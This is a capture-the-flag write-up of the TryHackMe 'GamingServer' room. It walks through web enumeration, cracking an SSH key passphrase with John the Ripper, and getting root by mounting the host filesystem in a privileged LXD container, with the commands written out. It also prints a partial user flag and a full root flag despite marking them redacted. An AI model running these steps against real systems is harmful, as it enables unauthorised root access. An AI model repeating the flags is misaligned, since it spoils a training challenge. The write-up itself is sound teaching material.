// Overview

GamingServer is a TryHackMe room that involves web enumeration, cracking an SSH key, and container-based privilege escalation. The target has a web server with a hidden directory that contains both a password list and an encrypted SSH private key. After managing to crack the key's passphrase and gaining initial access as john, the real difficulty lies in escalating our privileges to root, achieved by abusing LXD containers.

// Reconnaissance

Port Scanning

We start with a full port scan using nmap -sC -sV -p- to identify open services:

$ nmap -sC -sV -p- <target_ip>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29

The only two ports that are open are SSH and HTTP, and the Apache server is the one that draws our attention immediately.

Web Enumeration

The homepage reveals a gaming-themed site. A quick look at the page source shows a hidden comment:

<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

We now have a potential username: john.

The robots.txt file exposes an /uploads/ directory:

$ curl http://<target_ip>/robots.txt
user-agent: *
Allow: /
/uploads/

Visiting /uploads/ reveals three files:

dict.lst
manifesto.txt
meme.jpg

The dict.lst file is a wordlist consisting of common passwords such as letmein, password, and seasonal patterns, while the manifesto.txt file contains The Hacker Manifesto, which is most probably a red herring.

Running gobuster on the web root reveals a hidden /secret/ directory:

$ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

/secret               (Status: 301)
/uploads              (Status: 301)
/about.php            (Status: 200)
/about.html           (Status: 200)
/myths.html           (Status: 200)

The /secret/ directory contains an encrypted SSH private key:

$ cat /secret/secretKey
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----

This key is probably for the john user identified earlier.

// Initial Foothold

Cracking the SSH Key

We have an encrypted private key and a password list. The plan is to use ssh2john in order to convert the key into a format that John the Ripper can crack and run it against dict.lst:

$ ssh2john secretKey > hash.txt
$ john --wordlist=dict.lst hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
letmein          (secretKey)
1g 0:00:00:00 DONE

The passphrase is letmein, which is a classic choice.

Pro tip: ssh2john is uncluded in the John the Ripper suite; it's already installed on TryHackMe's AttackBox. On Kali, you can get it using the john package.

SSH Access

With the passphrase, we can SSH in as john:

$ ssh -i secretKey john@<target_ip>
Enter passphrase for key 'secretKey': letmein

john@exploitable:~$ cat user.txt
[FLAG_REDACTED]

We have obtained the user flag.

User Flag a5c2...

The command sudo -l fails with an authentication prompt, and John is not a member of the sudo group. Nevertheless, we find that he is in the lxd group:

$ id john
uid=1000(john) gid=1000(john) groups=1000(john),109(lxd)

This is our path to root.

// Privilege Escalation

LXD Container Exploit

Being in the lxd group enables us to create privileged containers and mount the host's root filesystem within them. This is a known method od privilege escalation.

Since the target machine has no internet access, we need to build an Alpine Linux image on our local machine and transfer it:

# On your local machine (AttackBox):
$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ ./build-alpine

# Transfer the image to the target:
$ scp -i secretKey alpine-v3.13-*.tar.gz john@10.80.140.250:/tmp/

On the target, import the image and create a privileged container:

$ lxc image import /tmp/alpine-v3.13-*.tar.gz --alias alpine
$ lxc init alpine privesc -c security.privileged=true
$ lxc start privesc

Now we mount the host's root filesystem inside the container:

$ lxc config device add privesc host-root disk source=/ path=/mnt/root

Finally, we drop into the container and access the host's root filesystem:

$ lxc exec privesc /bin/sh
~ # cd /mnt/root
/mnt/root # cat root/root.txt
[FLAG_REDACTED]
Root Flag 2e337b8c9f3aff0c2b3e8d4e6a7c88fc

We have root access.

What's Happening Here?

LXD containers run with root privileges by default whenever the security.privileged option is set to true, and by mounting the whole of the host's / directory into the container, we can read any file on the host system, including the root flag.

This is possible because:

  1. LXD runs as root
  2. Users in the lxd group can interact with the LXD daemon
  3. Privileged containers have full access to host resources

This is why membership of the lxd group should be restricted to trusted users only.

// Key Takeaways

Always check robots.txt and hidden directories. The /uploads/ directory was exposed via robots.txt, and /secret/ was discovered through directory enumeration. Both of these were essential to obtaining access.
Password lists do work, particularly when you have a specific target. The wordlist in question was small and focused. John the Ripper was able to crack the key in seconds. Never underestimate the power of a good wordlist.
Group membership matters. One single group membership, lxd, was the difference between user and root. After gaining initial access, always check id and groups.
LXD/LXC is a common privesc vector. If you are a memeber of the lxd group, you can very likely obtain root access. This is one of the first things to check when attempting to escalate privileges.
Know your escalation techniques. The LXD container escape is a well-known technique. If you learn the common ways to gain higher privileges, like this one, you can save a lot of time during engagements.
